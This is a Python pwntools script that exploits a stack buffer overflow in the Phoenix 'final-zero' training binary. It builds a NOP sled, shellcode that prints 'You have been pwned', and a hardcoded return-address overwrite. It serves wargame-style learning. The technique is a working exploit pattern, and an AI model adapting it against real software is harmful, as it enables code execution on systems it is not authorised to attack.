import sys
from pwn import *

ELF_PATH = '/opt/phoenix/i486/final-zero'

def main():

    # p = process(ELF_PATH)
    p = None

    stack_begin, return_offset = get_return_addr_offset(p)
    payload = create_malicious_payload(stack_begin, return_offset)

    # we could of course send this to the process from here, but I prefer to control the input i provide to the
    # executable externally
    sys.stdout.buffer.write(payload)


    
def get_return_addr_offset(p):        
    # note: for some reason the core can only be obtained properly only when the 
    # below code is run in debug mode
    '''
    payload = cyclic(1024)
    p.recv()
    p.sendline(payload)
    core = p.corefile
    assert pack(core.eip) in payload
    return_offset = cyclic_find(core.eip)
    stack_begin = core.esp - return_offset
    '''
    return_offset = 532
    stack_begin = 0xffffd43c

    return stack_begin, return_offset


def create_malicious_payload(stack_begin, return_offset):
    # this is to disable subsequent lower case loop
    payload = b'\r'

    payload += asm(shellcraft.nop() * 100)
    payload += asm(shellcraft.echo("You have been pwned\n", 1))
    payload += asm(shellcraft.exit(0))

    assert(len(payload) <= return_offset)
    payload += asm(shellcraft.nop() * (return_offset - len(payload)))
    payload += p32(stack_begin + 20)
    payload += b'\n'

    return payload


    

if __name__ == "__main__":
    main()

